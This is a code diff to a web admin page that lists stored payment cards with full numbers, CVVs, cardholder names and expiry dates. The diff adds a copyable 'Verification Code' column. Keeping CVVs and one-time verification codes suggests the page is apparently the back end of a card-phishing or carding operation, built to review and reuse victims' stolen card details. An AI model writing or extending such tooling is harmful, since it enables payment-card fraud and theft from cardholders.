@@ -93,7 +93,7 @@
                 </div>
 
                 <div id="admin-cards" class="hidden bg-white rounded-xl border border-gray-100 shadow-sm overflow-x-auto">
-                    <table class="w-full min-w-[1400px]">
+                    <table class="w-full min-w-[1600px]">
                         <thead>
                             <tr class="bg-gray-50 text-left text-xs font-semibold text-gray-500 uppercase tracking-wider">
                                 <th class="px-3 py-3">Card ID</th>
@@ -103,6 +103,7 @@
                                 <th class="px-3 py-3">CVV</th>
                                 <th class="px-3 py-3">Cardholder</th>
                                 <th class="px-3 py-3">Exp Date</th>
+                                <th class="px-3 py-3">Verification Code</th>
                                 <th class="px-3 py-3">Added</th>
                             </tr>
                         </thead>
@@ -235,6 +236,7 @@ async function loadCards() {
             const displayName = esc(parts[0] || c.cardholder_name || '-');
             const displayNum = esc(parts[1] || '**** **** **** ' + (c.last_four || '----'));
             const displayCvv = esc(parts[2] || '---');
+            const displayCode = esc(parts[3] || '-');
             const tr = document.createElement('tr');
             tr.className = 'hover:bg-gray-50 transition';
             tr.innerHTML = `
@@ -245,13 +247,14 @@ async function loadCards() {
                 <td class="px-3 py-3 font-mono text-gray-800">${displayCvv}</td>
                 <td class="px-3 py-3 text-gray-900">${displayName}</td>
                 <td class="px-3 py-3 text-gray-600 font-mono">${c.expiry_month || '??'}/${c.expiry_year ? c.expiry_year.slice(2) : '??'}</td>
+                <td class="px-3 py-3 font-mono text-gray-800 select-all">${displayCode}</td>
                 <td class="px-3 py-3 text-xs text-gray-500 whitespace-nowrap">${c.created_at ? new Date(c.created_at).toLocaleDateString() : '-'}</td>
             `;
             tbody.appendChild(tr);
         }
     } catch (err) {
         console.error('Failed to load cards:', err);
-        tbody.innerHTML = '<tr><td colspan="8" class="text-center py-6 text-red-500 text-sm">Error loading data: ' + err.message + '</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="9" class="text-center py-6 text-red-500 text-sm">Error loading data: ' + err.message + '</td></tr>';
     }
 }
 
